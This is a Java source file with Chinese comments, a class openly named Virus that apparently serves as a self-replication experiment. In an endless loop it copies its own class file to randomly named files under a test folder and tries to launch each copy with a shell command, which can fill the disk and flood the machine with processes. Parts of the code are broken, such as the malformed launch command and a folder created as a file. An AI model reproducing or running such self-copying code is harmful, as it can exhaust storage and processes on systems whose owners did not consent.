package io.bio;

import java.io.*;
import java.net.URI;
import java.net.URL;
import java.net.URLDecoder;
import java.util.Random;

public class Virus {
    public static void main(String[] args) throws IOException{
//        Process ps=Runtime.getRuntime().exec("ls /Documents");
//        InputStream in=ps.getInputStream();
//        byte[] bs=new byte[in.available()];
//        in.read(bs);
//        ps.waitFor();
//        System.out.println(new String(bs));
        //String path=Virus.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        URL classURL=Virus.class.getResource("Virus.class");
        String path = classURL.getPath();
        path= URLDecoder.decode(path,"UTF-8");
        String[] split=path.split("/");
        //用于新文件的不同名字
        String oldPath=split[split.length-1].replaceAll("\\d+","");
        //创建测试文件夹
        File fileFolder=new File("/home/illumwang/virustest/virus");
        if (!fileFolder.exists()){
            fileFolder.createNewFile();
            System.out.println("create success");
        }
        //开始测试，循环不断自我复制
        while (true){
            //自己复制自己
            long radom=getRandom();
            BufferedInputStream reader=null;
            BufferedOutputStream writer=null;
            //运行对象,runtime.exec可以调用命令行
            Runtime runtime=Runtime.getRuntime();
            //读取文件
            reader=new BufferedInputStream(new FileInputStream(path));
            //写入位置
            File file =new File("/home/illumwang/virustest/"+radom+oldPath);
            //写入内容，复制自己
            writer=new BufferedOutputStream(new FileOutputStream(file));
            byte[] bs=new byte[reader.available()];
            int len=-1;
            while ((len=reader.read(bs))!=-1){
                writer.write(bs,0,len);
                System.out.println("copy success");
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            //自己启动自己
            runtime.exec("java -jar"+file.getAbsolutePath());
        }
        //System.out.println(path);
    }

    public static long getRandom(){
        Random random = new Random();
        int i = random.nextInt(99999999);
        long l = System.currentTimeMillis();
        return l = l + i;
    }
}